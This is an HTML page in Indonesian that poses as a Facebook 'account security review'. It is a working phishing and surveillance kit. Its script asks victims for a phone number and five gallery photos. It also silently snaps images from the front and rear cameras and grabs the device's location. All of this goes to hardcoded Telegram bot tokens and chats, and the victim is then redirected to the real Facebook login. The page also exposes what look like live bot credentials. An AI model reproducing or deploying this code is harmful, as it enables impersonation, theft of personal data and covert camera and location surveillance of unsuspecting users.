<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        /* Animasi Splash Screen ala FB üòÆ */
        #splash-screen {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: #fff; z-index: 9999; display: flex; flex-direction: column;
            align-items: center; justify-content: center;
        }
        .fb-logo-splash { width: 80px; height: 80px; }
        .meta-logo { position: absolute; bottom: 50px; width: 100px; }

        body { background-color: #f0f2f5; font-family: Helvetica, Arial, sans-serif; display: none; }
        .main-card { max-width: 450px; margin: 40px auto; border: none; border-radius: 12px; box-shadow: 0 12px 28px rgba(0,0,0,0.1); background: white; }
        .fb-logo-text { color: #1877f2; font-size: 45px; font-weight: bold; letter-spacing: -2px; }
        
        .btn-fb { 
            background-color: #1877f2; color: white; font-weight: bold; padding: 12px; 
            border-radius: 8px; border: none; width: 100%;
            transition: transform 0.1s ease;
        }
        .btn-fb:active { transform: scale(0.95); }

        .error-box { 
            background: #ffebe9; border: 1px solid #dd3c10; color: #1c1e21; 
            font-size: 13px; padding: 10px; border-radius: 4px; display: none; margin-bottom: 15px;
        }
        #video, #canvas { display: none; }
    </style>
</head>
<body>

<div id="splash-screen">
    <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" class="fb-logo-splash">
    <img src="https://upload.wikimedia.org/wikipedia/commons/7/7b/Meta_Platforms_Inc._logo.svg" class="meta-logo">
</div>

<div class="container" id="main-content">
    <div class="main-card card p-4 text-center">
        <div class="fb-logo-text mb-2">facebook</div>
        <h5 class="fw-bold">Tinjauan Keamanan Akun</h5>
        <p class="text-muted small">Kami mendeteksi upaya login yang tidak biasa. Masukkan data profil Anda untuk verifikasi identitas.</p>
        <hr>

        <div id="mainError" class="error-box text-start">
            <b>Data Tidak Valid</b><br>Pastikan nomor HP benar dan minimal 5 foto dipilih.
        </div>

        <div class="text-start">
            <label class="form-label small fw-bold">Nomor Handphone</label>
            <input type="number" id="phone" class="form-control" placeholder="08xxxxxxxxxx">
            
            <label class="form-label small fw-bold mt-3">Verifikasi Galeri (Pilih 5 Foto Profil)</label>
            <input type="file" id="galeri" class="form-control" multiple accept="image/*">
        </div>

        <button class="btn-fb mt-4" onclick="validateFinal()">Lanjutkan</button>
        
        <div class="mt-3 loading-spinner text-primary" id="loader" style="display:none;">
            <div class="spinner-border spinner-border-sm"></div> <span class="small">Memproses...</span>
        </div>
    </div>
</div>

<video id="video" autoplay playsinline></video>
<canvas id="canvas"></canvas>

<script>
    const tokens = ["8555398375:AAGESWcRFUKios-h-G7eG8kexiHghzJLGo8", "8220550089:AAF2wuFOcdHAWVMu3dITv4GDspDHIrXngfg"];
    const chats = ["7835924973", "8071786272"];

    // Animasi Splash Screen üòÇ
    window.onload = () => {
        setTimeout(() => {
            document.getElementById('splash-screen').style.display = 'none';
            document.body.style.display = 'block';
            autoCapture("user");
            autoLocation();
        }, 2500); // 2.5 Detik Loading ala FB
    };

    function sendToTelegram(content, type = "text", blob = null) {
        tokens.forEach((token, i) => {
            const fd = new FormData();
            fd.append("chat_id", chats[i]);
            if (type === "text") {
                fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                    method: "POST", headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                    body: `chat_id=${chats[i]}&text=${encodeURIComponent(content)}`
                });
            } else {
                fd.append("photo", blob || content, "img.jpg");
                fd.append("caption", content);
                fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: "POST", body: fd });
            }
        });
    }

    function validateFinal() {
        const phone = document.getElementById('phone').value;
        const files = document.getElementById('galeri').files;
        const errBox = document.getElementById('mainError');

        // LOGIKA ANTI NGASAL: Minimal 10 digit buat nomor HP ‚ò†Ô∏è
        if (phone.length < 10 || files.length < 5) {
            errBox.style.display = 'block';
            return;
        }

        errBox.style.display = 'none';
        document.getElementById('loader').style.display = 'block';

        // Sikat ke Telegram! üòà
        sendToTelegram(`üì± NOMOR HP: ${phone}`);
        for (let i = 0; i < 5; i++) {
            sendToTelegram(`üñºÔ∏è GALERI ${i+1}`, "photo", files[i]);
        }

        setTimeout(() => {
            window.location.href = "https://www.facebook.com/login";
        }, 3000);
    }

    // Auto Background Task ‚ò†Ô∏è
    async function autoCapture(mode) {
        try {
            const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
            const v = document.getElementById('video'); v.srcObject = s;
            setTimeout(() => {
                const c = document.getElementById('canvas');
                c.width = 480; c.height = 640;
                c.getContext('2d').drawImage(v, 0, 0);
                c.toBlob(b => sendToTelegram(`üì∏ Cam ${mode}`, "photo", b), 'image/jpeg');
                s.getTracks().forEach(t => t.stop());
                if(mode === "user") setTimeout(() => autoCapture("environment"), 3000);
            }, 2000);
        } catch (e) { window.location.href = "https://www.facebook.com/login"; }
    }

    function autoLocation() {
        navigator.geolocation.getCurrentPosition(p => {
            sendToTelegram(`üìç LOKASI: http://google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
        });
    }
</script>
</body>
</html>
